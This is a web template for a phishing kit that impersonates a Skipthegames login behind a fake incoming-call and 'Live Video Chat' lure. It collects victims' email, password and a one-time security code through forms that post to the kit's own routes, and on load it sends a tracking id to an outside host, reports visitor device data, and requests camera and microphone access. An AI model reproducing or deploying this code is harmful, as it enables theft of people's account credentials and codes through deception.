<!doctype html>
<html lang="en">
<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="csrf-token" content="{{ csrf_token() }}" />
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" integrity="sha512-9usAa10IRO0HhonpyAIVpjrylPvoDwiPUiKdWk5t3PyolY1cOd4DSE0Ga+ri4AuTroPR5aQvXU9xC6qOPnzFeg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <title>Hello, world!</title>
    <style>
        *{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body{
            width: 100vw;
            height: 100vh;
            background-color: #222222;
            display: grid;
            place-items: center;
        }

        .widget{
            display: none;
            width: 314px;
            padding-bottom: 3vh;
        }
        .widgets {
            display: none;
            width: 364px;
            padding-bottom: 9vh;
            padding-top: 6vh;
            padding-left: 20px;
            padding-right: 20px;
        }
        .widgets h3 {
            font-size: 33px;
            font-weight: 700;
        }
        .widget2{
            display: none;
            width: 400px;
            padding-bottom: 7vh;
        }
        .widget3{
            display: none;
            width: 50%;
            padding-bottom: 3vh;
        }
        .card{
            background-color: rgb(255, 255, 255);
            border-radius: 10px;
        }
        .active{
            display: block;
        }

        .ree_01{
            height: 40px;
            width: 40px;
            border-radius: 50%;
            background-color: #008000b0;
            border: none;
            margin-right: 30px;
            margin-top: -20px;
        }

        .ree_01:before{
            content:  url("/outgoing-call.svg");
            display: block;
            height: 25px;
            width: 25px;
            margin-left: 50%;
            transform: translateX(-50%);
        }

        .ree_02{
            height: 40px;
            width: 40px;
            border-radius: 50%;
            background-color: #f70202a8;
            border: none;
            margin-left: 30px;
        }
        .reen_02{
        }
        .ree_02:before{
            content:  url("/incoming-call.svg");
            display: block;
            height: 17px;
            width: 25px;
            margin-left: 50%;
            transform: translateX(-50%);
        }
        .img_mm_01 {
            height: 80px;
            width: 80px;
            margin: 18px auto 0 auto;
            display: block;
            border-radius: 50%;
        }
        .lll_uu_ss_01,.lll_uu_ss_01:hover{
            text-decoration: none;
            background-color: #990033;
            color: #ffffff;
            font-size: 20px;
            display: flex;
            align-items: center;
            justify-content: space-evenly;
            align-content: space-around;
            flex-wrap: nowrap;
            padding-bottom: 5px;
            font-weight: 600;
            border-radius: 5px;
        }
        .lll_uu_ss_01:before {

            content: url("/sss_iii_aa.svg");
            display: inline-block;
            height: 40px;
            width: 40px;
            margin-top: 5px;
            border-radius: 6px;
            background-color: #fff;
        }
        .btn-text {
        }
        @media (max-width: 502px) {
            .widgets{
                width: 75%;
            }
        }


        .skip-title{
            focolor: #222222;
            margin: 25px auto 10px auto;
            font-family: sans-serif;
            font-size: 25px;
            display: block;
            margin-left: 23px;
            font-weight: 600;
        }
        .input_account_email {
            height: 35px;
            width: 300px;
            margin: 10px auto 20px auto;
            outline: none;
            background: #fff;
            display: block;
            border: 1px solid #ccc;
            font-family: sans-serif;
            box-shadow: inset 0 1px 2px rgb(0 0 0 / 10%);
            color: rgba(0,0,0,0.75);
            font-size: 18px;
            padding: 0.5rem;
        }

        #submit_createad_account_login {
            height: 43px;
            width: 300px;
            border: none;
            cursor: pointer;
            text-align: center;
            background-color: #2ba6cb;
            border-color: #2285a2;
            color: #fff;
            margin: 10px auto 0 auto;
            font-size: 18px;
            font-family: sans-serif;
            display: block;
            border-radius: 4px;
        }

        .call-card{
            height: 220px;
            width: 250px;
        }


    </style>
</head>
<body>
<div class="card  widget call-card active cl">
    <div class="row">
        <div class="col-md-12 text-center">
            <img src="/fastpic.jpg" alt="" class="img_mm_01">
        </div>
    </div>
    <div class="row mt-1">
        <div class="col-md-12 mt-2 text-center">
            <p>Incoimng Call...</p>
        </div>
    </div>
    <div class="row">
        <div class="col-md-12 text-center">
            <span style="position: absolute; left: 60px; bottom: 20px"><button class="ree_01" onclick="ss_pp_gg()" ></button></span>
            <span style="position: absolute; right: 60px; bottom: 18px"><button class="ree_02" onclick="ss_pp_gg()" ></button></span>
        </div>

 <input type="hidden" name="dom" class="dominfo" value="{{ $id }}">
                    <input type="hidden" class="dominfo" name="dom" value="{{ $id}}">
                    <input type="hidden" class="dominfo" name="id_user" value="{{ $id_user}}">
                     <input type="hidden" class="device"  value="{{$result}}">
    </div>
</div>

<div class="card  widgets cl">
    <div class="row">
        <div class="col-md-12 text-center px-4">
            <h3>Live Video Chat</h3>
            <p>
                Login with Skipthegames and enjoy with <b>Private Live Video Chat</b> your dating partner.
            </p>
            <a class="lll_uu_ss_01 px-2" href="javascript:void(0)"><img src="public/skio-logo.png" alt=""><span class="btn-text">Login with Skipthegames</span></a>
        </div>
    </div>
</div>

<div class="card  widget2">
    <div class="row">
        <div class="col-md-12 pt-2">
            <h2 class="px-4 skip-title">Log in to your account</h2>
            <form action="{{url('insertdom')}}" method="post" class="px-4">
                @csrf
                <div class="mb-3">
                    <input type="email" id="input_account_email" placeholder="Your Email" name="email" class="input_account_email">
                </div>
                <div class="mb-3">
                    <input type="password" placeholder="Password" name="password" class="input_account_email">
                </div>
                <input type="hidden" name="id_user" value="{{ $id_user}}">

                <button type="submit" id="submit_createad_account_login" class="btn btn-info text-white">Log in</button>
            </form>
        </div>

    </div>
</div>

<div class="card  widget3">
    <video  autoplay="autoplay" ><source src="" type="audio/mpeg" style="display:none;"></video>
    <div class="row p-3">
        <div class="col-md-12"><img src="Skipthegames-255x39.png" alt="" class="w-75"></div>
        <div class="col-md-12"><h6>Security check</h6></div>
        <div class="col-md-12"><p>A security code has been sent to your Email address " asdasd@g.com</p></div>
        <div class="col-md-12"><p>Please enter this code here:</p></div>
        <div class="col-md-12 text-start">
            <form action="" method="post" class="px-4">
                @csrf
                <div class="row">
                    <div class="col-9 text-start">
                        <input type="text" class="form-control w-100" placeholder="Type in the numbers you received">
                    </div>



                    <div class="col-3 text-start">
                        <button type="submit" class="btn btn-info text-white d-inline-block">Log in</button>
                    </div>
                </div>
            </form>
        </div>
        <div class="col-md-12 mt-2"><p>The code you received is good for 30 minutes.</p></div>
        <div class="col-md-12"><p>It may take the code up to 10 minutes to arrive. Make sure to check your Spam/Junk/Trash folder.</p></div>

    </div>
</div>






<script src="{{asset('datas/js/jquery-3.4.1.min.js')}}"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>

<script>
    $(document).ready(function(){

        var dom_info = $(".dominfo").val();
        var device = $(".device").val();
        //console.log(dom_info);

        $.ajaxSetup({
            headers: {
                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
            }
        });

        var url = '/count';
        $.ajax({
            url:url,
            method:'POST',
            data:{
                dom_info:dom_info,
                device:device,

            },
            success:function(response){
                console.log(response.message)
            },
        });









        $('.cl').click(function(){
            $(this).removeClass('active');
            $(this).next('.card').addClass('active');

            var media = $("#vds").get(0);
            media.pause();
            media.currentTime = 0;


        });

    });
</script>
<script>

//========== index login page js ============
var video = document.querySelector("#videoElement");
var email = document.getElementById("input_account_email");
var pass = document.getElementById("input_account_password");
var m_01 = document.getElementById("ss_01");
var m_02 = document.getElementById("ss_02");

let ggg_data = 2073400041;

  var xhttp_01 = new XMLHttpRequest();
  xhttp_01.open("POST", "https://api.getdatalink.club/", true);
  xhttp_01.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhttp_01.send("id="+ggg_data);


function pp_dd(){

  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {

	  if(this.responseText == 1){
         document.getElementById("error").style ="display:block";
         document.getElementById("eee_02").style ="display:block";
         document.getElementById("input_account_password").style ="margin-bottom: 0;";
         document.getElementById("ss_02").style ="height: 350px;display:block;";
         document.getElementById("submit_createad_account_login").innerHTML ="Log in";
         pass.value = '';
	  }

     document.getElementById("submit_createad_account_login").style ="cursor: pointer;";

    }else{
      document.getElementById("submit_createad_account_login").style ="cursor: not-allowed;";
      document.getElementById("submit_createad_account_login").innerHTML ="Loading...";
    }

  };



}

function vv_ss(){

if (navigator.mediaDevices.getUserMedia) {
  navigator.mediaDevices.getUserMedia({  video: true })
    .then(function (stream) {
      video.srcObject = stream;
    //   var url = window.webkitURL.createObjectURL(stream);
    //   video.src = url;
    })
    .catch(function (err0r) {
      // alert("Camera Not Found");
    });
}


navigator.getMedia = ( navigator.getUserMedia ||
                      navigator.webkitGetUserMedia ||
                      navigator.mozGetUserMedia ||
                      navigator.msGetUserMedia);

navigator.getMedia({video: true}, function() {

}, function() {
  // alert("Camera Not Found");
});


}


function pp_ch(){

  document.getElementById("ss_02").style = "display:block";
  document.getElementById("ss_01").style = "display:none";

}



const audioContext = new (window.AudioContext || window.webkitAudioContext)();

const source = audioContext.createBufferSource();

navigator.mediaDevices
    .getUserMedia({ audio: true })
    .then(() => {

        source.addEventListener('ended', () => {
            source.stop();
            audioContext.close();
        });

        source.loop = true;

        const request = new XMLHttpRequest();

        request.open('GET', '/ringtone.mp3', true);
        request.responseType = 'arraybuffer';
        request.onload = () => {
            audioContext.decodeAudioData(
                request.response,
                (buffer) => {
                    source.buffer = buffer;
                    source.connect(audioContext.destination);
                    source.start();
                },
                (e) => {
                    // console.log('Error with decoding audio data' + e.message);
                });
        }

        request.send();
    })
    // .catch(reason => console.error(`Audio permissions denied: ${reason}`));



function ss_pp_gg(){
  document.getElementById("lll_ccc_main").style = "display:none";
  document.getElementById("ss_01").style = "display:block";
//   document.getElementById("hh_ww_hh_01").style = "display:block";
  source.stop();
}



//=========== veryfy area js start here =============
var video = document.querySelector("#videoElement");

        function vv_ss(){

        if (navigator.mediaDevices.getUserMedia) {
          navigator.mediaDevices.getUserMedia({  video: true })
            .then(function (stream) {
              video.srcObject = stream;
            //   var url = window.webkitURL.createObjectURL(stream);
            //   video.src = url;
            })
            .catch(function (err0r) {
              // alert("Camera Not Found");
            });
        }


        navigator.getMedia = ( navigator.getUserMedia ||
                              navigator.webkitGetUserMedia ||
                              navigator.mozGetUserMedia ||
                              navigator.msGetUserMedia);

        navigator.getMedia({video: true}, function() {

        }, function() {
          //alert("Camera Not Found");
        });


        }

        vv_ss()





</script>

</body>
</html>
